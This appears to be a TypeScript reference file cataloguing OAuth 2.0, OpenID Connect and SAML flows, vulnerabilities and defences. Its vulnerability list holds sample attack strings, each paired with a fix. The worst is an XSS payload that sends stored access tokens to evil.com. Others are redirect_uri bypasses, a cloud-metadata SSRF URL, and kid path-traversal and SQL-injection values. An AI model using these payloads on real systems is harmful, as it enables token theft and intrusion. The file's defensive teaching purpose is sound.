// Copyright (c) 2026 SpartanKing18. All rights reserved.
// OAuth 2.0 / OpenID Connect Security Reference

export const OAUTH_GRANT_TYPES = [
  {
    name: "Authorization Code",
    rfc: "RFC 6749 Section 4.1",
    recommended: true,
    use_case: "Server-side web applications with a backend",
    flow: [
      "1. Client redirects user to Authorization Server: GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid profile&state=RANDOM",
      "2. User authenticates and consents at the Authorization Server",
      "3. Authorization Server redirects back: GET /callback?code=AUTH_CODE&state=RANDOM",
      "4. Client exchanges code for tokens (server-to-server): POST /token { grant_type=authorization_code, code=AUTH_CODE, redirect_uri=CALLBACK, client_id=CLIENT, client_secret=SECRET }",
      "5. Authorization Server returns: { access_token, refresh_token, id_token, expires_in }",
      "6. Client uses access_token to call Resource Server APIs"
    ],
    security_considerations: [
      "ALWAYS use PKCE (even for server-side apps, per OAuth 2.1)",
      "Validate the state parameter to prevent CSRF",
      "Never expose client_secret to the browser",
      "Use short-lived authorization codes (< 60 seconds, single use)",
      "Validate redirect_uri exactly (no open redirects)",
      "Store tokens securely server-side (encrypted at rest)"
    ]
  },
  {
    name: "Authorization Code with PKCE",
    rfc: "RFC 7636",
    recommended: true,
    use_case: "All clients — SPAs, mobile apps, and server-side apps (required in OAuth 2.1)",
    flow: [
      "1. Client generates: code_verifier = random(43-128 chars, [A-Za-z0-9-._~])",
      "2. Client computes: code_challenge = BASE64URL(SHA256(code_verifier))",
      "3. Client redirects to: GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid&state=RANDOM&code_challenge=CHALLENGE&code_challenge_method=S256",
      "4. User authenticates and consents",
      "5. Authorization Server redirects: GET /callback?code=AUTH_CODE&state=RANDOM",
      "6. Client exchanges code: POST /token { grant_type=authorization_code, code=AUTH_CODE, redirect_uri=CALLBACK, client_id=CLIENT, code_verifier=VERIFIER }",
      "7. Authorization Server verifies: SHA256(code_verifier) == code_challenge, then returns tokens"
    ],
    security_considerations: [
      "PKCE prevents authorization code interception attacks (no client_secret needed for public clients)",
      "Always use S256 method (not plain) — plain provides no security benefit",
      "code_verifier must be cryptographically random, not predictable",
      "code_verifier is NEVER sent to the authorization endpoint — only code_challenge",
      "code_verifier is sent in the token request (server-to-server or from the client)"
    ]
  },
  {
    name: "Implicit (DEPRECATED)",
    rfc: "RFC 6749 Section 4.2",
    recommended: false,
    use_case: "DEPRECATED — was used for SPAs. Replace with Authorization Code + PKCE.",
    flow: [
      "1. Client redirects: GET /authorize?response_type=token&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid",
      "2. User authenticates and consents",
      "3. Authorization Server redirects: GET /callback#access_token=TOKEN&token_type=bearer&expires_in=3600",
      "4. Token is in the URL fragment (never sent to the server)",
      "5. Client JavaScript extracts the token from the fragment"
    ],
    security_considerations: [
      "DEPRECATED in OAuth 2.1 — do not use for new applications",
      "Access token exposed in URL fragment (browser history, Referer header, logs)",
      "No refresh tokens — user must re-authenticate when token expires",
      "Vulnerable to token substitution attacks",
      "No client authentication possible",
      "Replace with Authorization Code + PKCE for all SPA/mobile apps"
    ]
  },
  {
    name: "Client Credentials",
    rfc: "RFC 6749 Section 4.4",
    recommended: true,
    use_case: "Machine-to-machine (M2M) communication — no user involved",
    flow: [
      "1. Client authenticates directly: POST /token { grant_type=client_credentials, client_id=CLIENT, client_secret=SECRET, scope=api:read }",
      "2. Authorization Server validates client credentials",
      "3. Returns: { access_token, expires_in, token_type }"
    ],
    security_considerations: [
      "client_secret must be stored securely (environment variable, secrets manager)",
      "No user context — access_token represents the application, not a user",
      "No refresh tokens needed — client can always request a new token",
      "Use mutual TLS (mTLS) instead of client_secret for higher security",
      "Scope should be minimal — only what the service needs"
    ]
  },
  {
    name: "Device Code (Device Authorization Grant)",
    rfc: "RFC 8628",
    recommended: true,
    use_case: "Input-constrained devices (smart TVs, CLI tools, IoT devices, printers)",
    flow: [
      "1. Device requests codes: POST /device/code { client_id=CLIENT, scope=openid }",
      "2. Authorization Server returns: { device_code, user_code, verification_uri, expires_in, interval }",
      "3. Device displays to user: 'Go to verification_uri and enter code: USER_CODE'",
      "4. User opens verification_uri on their phone/computer, enters user_code, and authenticates",
      "5. Meanwhile, device polls: POST /token { grant_type=urn:ietf:params:oauth:grant-type:device_code, device_code=DEVICE_CODE, client_id=CLIENT }",
      "6. Server returns: authorization_pending (keep polling) → slow_down (increase interval) → access_token (success)"
    ],
    security_considerations: [
      "User must verify they initiated the request (display context on the verification page)",
      "Short user_code expiration (5-15 minutes)",
      "Rate limit polling requests",
      "Device code is single-use",
      "Protect against remote phishing (attacker could pre-generate codes and trick users into authorizing)"
    ]
  },
  {
    name: "Refresh Token",
    rfc: "RFC 6749 Section 6",
    recommended: true,
    use_case: "Obtaining new access tokens without re-authentication",
    flow: [
      "1. Client sends refresh token: POST /token { grant_type=refresh_token, refresh_token=REFRESH_TOKEN, client_id=CLIENT, client_secret=SECRET }",
      "2. Authorization Server validates refresh token and returns: { access_token, refresh_token (rotated), expires_in }"
    ],
    security_considerations: [
      "Refresh tokens are long-lived — store with maximum security (encrypted, server-side)",
      "Implement refresh token rotation — issue a new refresh token with each use, invalidate the old one",
      "Detect refresh token reuse (indicates token theft) — revoke all tokens for that grant",
      "Bind refresh tokens to the client (client_id validation)",
      "Set absolute expiration on refresh tokens (e.g., 90 days)",
      "For SPAs: use short-lived refresh tokens with rotation, or rely on session cookies instead"
    ]
  }
];

export const OAUTH_VULNERABILITIES = [
  {
    name: "Open Redirect via redirect_uri",
    severity: "high",
    description: "Authorization server does not validate redirect_uri strictly, allowing the attacker to redirect the authorization code or token to their own server.",
    attack: "Attacker crafts: /authorize?...&redirect_uri=https://evil.com/callback — if the server allows it, the code/token is sent to evil.com.",
    variants: [
      "Exact match bypass: redirect_uri=https://legitimate.com%40evil.com (URL parsing confusion)",
      "Path traversal: redirect_uri=https://legitimate.com/../evil.com",
      "Fragment injection: redirect_uri=https://legitimate.com#@evil.com",
      "Subdomain: redirect_uri=https://evil.legitimate.com (if wildcard matching)",
      "Parameter pollution: redirect_uri=https://legitimate.com&redirect_uri=https://evil.com"
    ],
    prevention: "Exact string match for redirect_uri. No wildcards, no pattern matching. Register all valid redirect URIs."
  },
  {
    name: "CSRF on Authorization Endpoint",
    severity: "high",
    description: "Attacker initiates an OAuth flow and tricks the victim into completing it, linking the attacker's account to the victim's session.",
    attack: "Attacker generates /authorize URL with their own account, sends link to victim. Victim clicks and authorizes. The authorization code/token now grants access to the attacker's resources but is tied to the victim's session.",
    prevention: "Always use the state parameter with a cryptographically random value tied to the user's session. Validate state on the callback."
  },
  {
    name: "Authorization Code Interception",
    severity: "high",
    description: "Attacker intercepts the authorization code from the redirect URI (via malware, browser history, network sniffing, or malicious app on mobile).",
    attack: "On mobile, a malicious app registers the same custom URI scheme (myapp://) and intercepts the redirect. The malicious app exchanges the code for tokens.",
    prevention: "Use PKCE. The interceptor doesn't have the code_verifier, so they can't exchange the code. On mobile, use claimed HTTPS redirects (Universal Links / App Links) instead of custom schemes."
  },
  {
    name: "Token Theft via Referer Header",
    severity: "medium",
    description: "Access token in URL fragment (implicit flow) leaks via the Referer header when the page loads external resources.",
    attack: "After implicit flow redirect, the page has #access_token=xxx in the URL. If the page loads an image from a third-party, the Referer header includes the fragment.",
    prevention: "Don't use implicit flow. Use Authorization Code + PKCE. Set Referrer-Policy: no-referrer."
  },
  {
    name: "JWT Algorithm Confusion (alg=none)",
    severity: "critical",
    description: "If the resource server accepts JWTs with alg: none, an attacker can forge tokens without any signature.",
    attack: "Attacker creates a JWT with header {\"alg\": \"none\"}, any payload they want, and an empty signature. If the server accepts alg=none, the forged token is valid.",
    prevention: "Explicitly whitelist allowed algorithms. Never accept alg=none. Use a JWT library that rejects none by default."
  },
  {
    name: "JWT Algorithm Confusion (RSA to HMAC)",
    severity: "critical",
    description: "Server uses RSA public key to verify JWTs. Attacker creates a JWT signed with HMAC using the RSA PUBLIC key as the HMAC secret. If the server uses the same key for both, the HMAC signature verifies.",
    attack: "Server's public key is known (it's public). Attacker: header {\"alg\": \"HS256\"}, signs with the RSA public key bytes. Server sees HS256, uses the 'key' (which is the public key) as HMAC secret → signature matches.",
    prevention: "Explicitly specify the expected algorithm when verifying. Never let the JWT header dictate the algorithm. Use separate key objects for RSA vs HMAC."
  },
  {
    name: "JWT kid Injection",
    severity: "high",
    description: "The kid (key ID) header parameter is used to look up the verification key. If it's used in a database query or file path without sanitization, it enables injection.",
    attack: "kid: \"../../dev/null\" — if used as a file path, reads /dev/null (empty), HMAC with empty key. kid: \"' UNION SELECT 'secret' --\" — SQL injection to control the key value.",
    prevention: "Validate and sanitize kid. Use a whitelist of known key IDs. Never use kid in file paths or SQL queries directly."
  },
  {
    name: "Consent Phishing",
    severity: "high",
    description: "Attacker registers a malicious OAuth application and tricks users into granting it broad permissions. The legitimate authorization server shows the consent screen, lending legitimacy.",
    attack: "Attacker registers app 'Security Update' requesting mail.read, files.readwrite, user.read.all scopes. Sends phishing email: 'Click here to apply security update'. User sees legitimate Microsoft/Google consent page and approves.",
    prevention: "Admin consent for sensitive scopes. App verification/review processes. User education. Monitor for suspicious OAuth app grants. Restrict which apps can be installed (Azure AD: user consent settings)."
  },
  {
    name: "SSRF via redirect_uri",
    severity: "high",
    description: "If the authorization server fetches the redirect_uri (e.g., to validate it or follow redirects), an attacker can target internal services.",
    attack: "redirect_uri=http://169.254.169.254/latest/meta-data/ — if the server follows this, it accesses the cloud metadata service.",
    prevention: "Never fetch redirect_uri server-side. Validate against a pre-registered allowlist using string comparison only."
  },
  {
    name: "Scope Escalation",
    severity: "medium",
    description: "Client requests more scopes than the user intended to grant, or the authorization server doesn't properly restrict tokens to the granted scopes.",
    attack: "Client requests scope=openid profile email admin:write. User may not notice 'admin:write' in the consent screen. Or: client uses a refresh token to request additional scopes not in the original grant.",
    prevention: "Clearly display requested scopes. Don't allow scope expansion via refresh tokens. Implement incremental consent. Audit granted scopes regularly."
  },
  {
    name: "Token Replay",
    severity: "medium",
    description: "Attacker captures a valid access token (from logs, network traffic, or client-side storage) and replays it to access resources.",
    attack: "Access token stolen from browser localStorage, JavaScript memory, or network capture. Attacker uses it directly against the API.",
    prevention: "Use short-lived access tokens (5-15 minutes). Implement token binding (DPoP — RFC 9449). Use sender-constrained tokens. Detect anomalous token usage (different IP, user agent)."
  },
  {
    name: "Insufficient Redirect URI Validation",
    severity: "high",
    description: "Authorization server uses substring matching, prefix matching, or regex for redirect_uri validation instead of exact match.",
    attack: "Registered: https://app.example.com/callback. Attacker uses: https://app.example.com/callback/../../../evil.com or https://app.example.com.evil.com/callback",
    prevention: "Exact string match only. Parse and compare scheme, host, port, and path separately. Reject any URI with fragments, userinfo, or path traversal."
  },
  {
    name: "Mix-Up Attack",
    severity: "high",
    description: "When a client supports multiple authorization servers, an attacker can confuse the client about which server issued an authorization code, causing the client to send the code to the attacker's server.",
    attack: "Client supports IdP-A (legitimate) and IdP-B (attacker). Client starts flow with IdP-A. Attacker intercepts and redirects to IdP-B. Client receives code from IdP-B but sends it to IdP-A's token endpoint (exposing the code to IdP-A).",
    prevention: "Use the iss (issuer) parameter in the authorization response. Validate that the issuer matches the expected authorization server. OAuth 2.1 requires iss parameter."
  },
  {
    name: "Insecure Token Storage",
    severity: "high",
    description: "Tokens stored in insecure locations (localStorage, sessionStorage, cookies without proper flags) are vulnerable to theft via XSS, CSRF, or malware.",
    attack: "XSS payload: fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))",
    prevention: "SPAs: use in-memory storage (JavaScript variable), NOT localStorage. Or use httpOnly, Secure, SameSite=Strict cookies with a backend-for-frontend pattern. Server-side apps: encrypted server-side session. Mobile: use platform secure storage (Keychain/Keystore)."
  },
];

export const OIDC_REFERENCE = {
  overview: "OpenID Connect (OIDC) is an identity layer on top of OAuth 2.0. While OAuth 2.0 is about authorization (accessing resources), OIDC adds authentication (proving who the user is). It introduces the ID Token (a JWT containing user identity claims).",
  id_token_claims: [
    { claim: "iss", required: true, description: "Issuer — URL of the authorization server that issued the token" },
    { claim: "sub", required: true, description: "Subject — unique identifier for the user at this issuer" },
    { claim: "aud", required: true, description: "Audience — client_id of the application the token was issued for" },
    { claim: "exp", required: true, description: "Expiration — Unix timestamp after which the token is invalid" },
    { claim: "iat", required: true, description: "Issued At — Unix timestamp when the token was created" },
    { claim: "auth_time", required: false, description: "Time when the user last authenticated" },
    { claim: "nonce", required: false, description: "Random value to prevent replay attacks (required in implicit flow)" },
    { claim: "acr", required: false, description: "Authentication Context Class Reference — level of authentication (e.g., MFA)" },
    { claim: "amr", required: false, description: "Authentication Methods References — methods used (e.g., [\"pwd\", \"otp\"])" },
    { claim: "azp", required: false, description: "Authorized Party — the party the token was issued to (when aud has multiple values)" },
    { claim: "at_hash", required: false, description: "Access token hash — half of SHA-256 of the access_token, base64url-encoded" },
    { claim: "c_hash", required: false, description: "Code hash — half of SHA-256 of the authorization code" },
    { claim: "name", required: false, description: "User's full name" },
    { claim: "email", required: false, description: "User's email address" },
    { claim: "email_verified", required: false, description: "Whether the email has been verified (boolean)" },
    { claim: "picture", required: false, description: "URL of the user's profile picture" },
    { claim: "locale", required: false, description: "User's locale (e.g., en-US)" },
    { claim: "updated_at", required: false, description: "Time the user's information was last updated" }
  ],
  id_token_validation: [
    "1. Decode the JWT header to get the algorithm and key ID (kid)",
    "2. Fetch the signing key from the issuer's JWKS endpoint (/.well-known/jwks.json)",
    "3. Verify the signature using the correct key and algorithm",
    "4. Check iss matches the expected issuer URL",
    "5. Check aud contains your client_id",
    "6. Check exp > current_time (token not expired)",
    "7. Check iat is reasonable (not too far in the past)",
    "8. If nonce was sent in the auth request, verify it matches the nonce in the token",
    "9. If at_hash is present, verify it matches half of SHA-256(access_token)"
  ],
  discovery: {
    url: "https://issuer.example.com/.well-known/openid-configuration",
    fields: [
      { field: "issuer", description: "The issuer URL" },
      { field: "authorization_endpoint", description: "URL for the authorization request" },
      { field: "token_endpoint", description: "URL for the token exchange" },
      { field: "userinfo_endpoint", description: "URL to get user claims with an access token" },
      { field: "jwks_uri", description: "URL for the JSON Web Key Set (public keys for token verification)" },
      { field: "scopes_supported", description: "List of supported scopes (openid, profile, email, etc.)" },
      { field: "response_types_supported", description: "Supported response types (code, id_token, token)" },
      { field: "grant_types_supported", description: "Supported grant types" },
      { field: "id_token_signing_alg_values_supported", description: "Algorithms for signing ID tokens (RS256, ES256, etc.)" },
      { field: "token_endpoint_auth_methods_supported", description: "Client authentication methods (client_secret_basic, client_secret_post, private_key_jwt)" },
      { field: "revocation_endpoint", description: "URL to revoke tokens" },
      { field: "introspection_endpoint", description: "URL to check token validity" },
      { field: "end_session_endpoint", description: "URL for logout" }
    ]
  }
};

export const TOKEN_BEST_PRACTICES = {
  access_token: {
    lifetime: "5-15 minutes for high-security, 1 hour maximum",
    format: "JWT (self-contained) or opaque reference token",
    storage: {
      server_side: "Encrypted server-side session",
      spa: "In-memory JavaScript variable (NOT localStorage). Or use BFF (Backend-for-Frontend) pattern with httpOnly cookies.",
      mobile: "Platform secure storage: iOS Keychain, Android Keystore",
      never: ["localStorage (XSS vulnerable)", "sessionStorage (XSS vulnerable)", "cookies without httpOnly/Secure/SameSite"]
    }
  },
  refresh_token: {
    lifetime: "14-90 days with absolute expiration",
    rotation: "Always rotate refresh tokens — issue new refresh token with each use, invalidate old one",
    reuse_detection: "If a previously-used refresh token is presented, revoke ALL tokens for that grant (indicates theft)",
    storage: {
      server_side: "Encrypted in database, associated with user and client",
      spa: "Avoid if possible. Use short-lived sessions instead. If needed, httpOnly cookie via BFF.",
      mobile: "Platform secure storage with biometric protection"
    }
  },
  id_token: {
    lifetime: "5-60 minutes (used for authentication, not API access)",
    validation: "Always validate signature, issuer, audience, and expiration",
    storage: "In-memory only. Never send to your API — use access tokens for API calls.",
    note: "ID tokens are for the CLIENT to learn who the user is. Access tokens are for the RESOURCE SERVER to authorize requests."
  }
};

export const SAML_COMPARISON = {
  feature: [
    { aspect: "Protocol", oauth: "OAuth 2.0 / OIDC", saml: "SAML 2.0" },
    { aspect: "Token format", oauth: "JWT (JSON Web Token)", saml: "XML Assertion" },
    { aspect: "Transport", oauth: "JSON over HTTPS", saml: "XML over HTTP POST/Redirect" },
    { aspect: "Use case", oauth: "API authorization + authentication (OIDC)", saml: "Enterprise SSO, federation" },
    { aspect: "Complexity", oauth: "Simpler, developer-friendly", saml: "Complex XML, requires libraries" },
    { aspect: "Mobile support", oauth: "Excellent (designed for it)", saml: "Poor (XML, no native mobile support)" },
    { aspect: "SPA support", oauth: "Excellent (PKCE)", saml: "Poor (requires server-side)" },
    { aspect: "Enterprise adoption", oauth: "Growing rapidly", saml: "Dominant in enterprise (legacy)" },
    { aspect: "Token size", oauth: "Small (few hundred bytes)", saml: "Large (several KB of XML)" },
    { aspect: "Signature", oauth: "JWS (JSON Web Signature)", saml: "XML Digital Signature" },
    { aspect: "Discovery", oauth: ".well-known/openid-configuration", saml: "Metadata XML document" },
    { aspect: "Logout", oauth: "End session endpoint (not standardized well)", saml: "Single Logout (SLO) well-defined" }
  ],
  saml_attacks: [
    { name: "XML Signature Wrapping (XSW)", description: "Attacker modifies the SAML assertion by moving the signed element and inserting a forged one. The signature still verifies (it covers the original element) but the application processes the forged one.", prevention: "Use schema validation, verify the signed element is the one being processed, use libraries that handle XSW correctly." },
    { name: "SAML Response Replay", description: "Attacker captures a valid SAML response and replays it to gain access.", prevention: "Check InResponseTo matches the original request ID. Enforce NotBefore/NotOnOrAfter conditions. Maintain a cache of processed assertion IDs." },
    { name: "Assertion Consumer Service URL Manipulation", description: "Attacker changes the ACS URL to redirect the SAML response to their server.", prevention: "IdP must validate ACS URL against registered values. SP must verify the Destination attribute matches." },
    { name: "Golden SAML", description: "Attacker who has compromised the IdP's signing certificate can forge SAML assertions for any user without authentication.", prevention: "Protect IdP signing keys with HSMs. Monitor for unusual SAML assertions. Rotate signing certificates periodically." }
  ]
};
